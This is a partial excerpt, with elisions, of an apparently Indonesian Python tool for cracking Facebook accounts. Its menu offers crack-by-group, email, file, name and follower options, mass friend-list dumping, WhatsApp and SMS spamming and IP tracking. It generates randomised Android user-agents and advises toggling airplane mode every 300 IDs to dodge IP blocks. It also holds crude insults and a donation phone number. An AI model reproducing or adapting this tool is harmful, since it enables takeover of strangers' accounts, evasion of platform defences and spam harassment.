...
try:
	...
	print(' [+] Koneksi Internet Anda Tidak Terdeteksi Silahkan Cek Kuota Anda Ya Salam Dari GreynoooXD')
...
for brayen in range(10000):
    rr = random.randint
    rc = random.choice
    u1 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; Infinix X675 Build/RP1A.{str(rr(111111,210000))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u2 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; CPH2119 Build/SP1A.{str(rr(111111,210000))}.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u3 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; I2208 Build/TP1A.{str(rr(111111,210000))}.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u4 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; RMX3235 Build/RP1A.{str(rr(111111,210000))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u5 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-M325FV Build/RP1A.{str(rr(111111,210000))}.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u6 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; RMX3581 Build/RP1A.{str(rr(111111,210000))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u7 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-A405FN Build/RP1A.{str(rr(111111,210000))}.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u8 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; Infinix X6811B Build/RP1A.{str(rr(111111,210000))}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u9 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; M2102J20SG Build/TKQ1.{str(rr(111111,210000))}.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u10 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; 21061110AG Build/SP1A.{str(rr(111111,210000))}.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u11 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; Redmi Note 9 Pro Max Build/SKQ1.{str(rr(111111,210000))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u12 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; RMX3263 Build/RP1A.{str(rr(111111,210000))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u13 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; LH9810 Build/OPM.{str(rr(111111,210000))}.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u14 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; Infinix X680B Build/QP1A.{str(rr(111111,210000))}.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u15 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; en-us; 220333QNY Build/RKQ1.{str(rr(111111,210000))}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    UaMainn = random.choice([u1, u2, u3, u4, u5, u6, u7, u8, u9, u10, u11, u12, u13, u14, u15])
    ugen.append(UaMainn)
...
#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
	cetak(panel(f"""[bold red]                ___  ____ ____ _   _ ____ _  _ _  _ _  _ 
[bold red]               HALO ANAK-ANAK TUKANG MALING
[bold red]               LAIN KALI BERMODAL YA  WKWKWK                                                                                                     
				...
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					...
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						...
						if 'Sukses!' in str(response6):
							...
							print("\n [+] Login Berhasil | python glets.py");exit()
			except Exception as e:
...
def menu(my_name,my_id):
	...
	cetak(panel(f"[bold white]"Kalau Ada Duit Donasi Dikitlaj No. Dana : 081388341152 Dan Terima Kasih Kepada BrayennnXD",width=90,title=f"[bold green]MOHON DIBACA",padding=(0,5),style=f"bold white"))
	...
	if _____greynooo___xd____ in ['1','01']:
		...
		crack_group()
	elif _____greynooo___xd____ in ['4','04']:
		crack_email()
	elif _____greynooo___xd____ in ['5','05']:
		crack_file()
	elif _____greynooo___xd____ in ['6','06']:
		crack_nama()
	elif _____greynooo___xd____ in ['7','07']:
		pengikut()
	elif _____greynooo___xd____ in ['8','08']:
		komen()
	elif _____greynooo___xd____ in ['9','09']:
		file_cp()
	elif _____greynooo___xd____ in ['10']:
		result()
	elif _____greynooo___xd____ in ['11']:
		siu()
	elif _____greynooo___xd____ in('12'):
		spam_wa()
	elif _____greynooo___xd____ in('13'):
		spam_sms()
	elif _____greynooo___xd____ in('14'):
		lacakip()
	elif _____greynooo___xd____ in ['15']:
...
#----------------------[ MENU CRACK LAINNYA ]----------------------#
def lainnya():
	cetak(panel(f"[[bold red]01[bold red]] Crack Nama                   [[bold red]03[bold red]] Crack File \n[[bold red]02[bold red]] Crack Pengikut                  [[bold red]04[bold red]] Crack Email ",width=90,title=f"[bold red]Menu Crack",padding=(0,8),style=f"bold red"))
...
def brayen_dump():
	try:
		...
		exit()
	cetak(panel('\t            [bold red]Ketik [bold red]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,style='bold red'))
...
def dump_massal():
	try:
		...
		exit()
	try:
		cetak(panel('\t            [bold red]Ketik [bold red]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,title=f"[bold red]Crack Massal",style=f"bold red"))
...
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	cetak(panel(f'[bold red][[bold red]01[/][bold red]][/] [bold red]Crack Id Tua Ke Baru [[bold red]Not Recommended[bold yellow]][/]\n[bold yellow][[bold yellow]02[/][bold yellow]][/] [bold yellow]Crack Idz Baru Ke Tua [[bold yellow]Recommended[bold green]][/]\n[bold green][[bold green]03[/][bold green]][/] [bold green]Crack Idz Acak [[bold green]Very Recommended[bold green]][/]',width=90,padding=(0,8),title=f"[bold red]Setting Urutan Idz",style=f"bold red"))
...
[bold white][[bold cyan]03[bold white]] [bold white]Menggunakan Password Manual [[bold red]Not Recommended[bold white]]''',style='bold white',title='[bold green]Setting Password',padding=(0,8),width=90))
	...
	cetak(panel(f'      [bold red]Apakah Anda Ingin Menampilkan Aplikasi Yang Terkait Di Dalam Akun ? Y/T',width=90,title=f"[bold red]Setting Cek Apk",style=f"bold red"))
	...
	cetak(panel(f'      [bold red]Apakah Anda Ingin Menampilkan Opsi Checkpoint Di Dalam Akun ? Y/T',width=90,title=f"[bold red]Cek Opsi",style=f"bold red"))
	_brayen_ = input(' [+] Pilih : ')
	if _brayen_ in ['']:
		print(' [+] Pilih Yang Bener Kontol ')
		back()
	...
	cetak(panel(f'[bold red]Apakah Anda Ingin Mengunakan User-Agent Manual Untuk Melakukan Crack Account ? Y/T',width=90,title=f"[bold red]Setting User-Agent",style=f"bold red"))
...
def passwrd():
	...
	cetak(panel(f'\t[bold red]On/Off Mode Pesawat Setiap 300 Idz Agar Terhindar Dari Spam Ip',width=90,title=f"[bold red]Informasi",subtitle=f"[bold red]Proses Crack",style=f"bold red"))
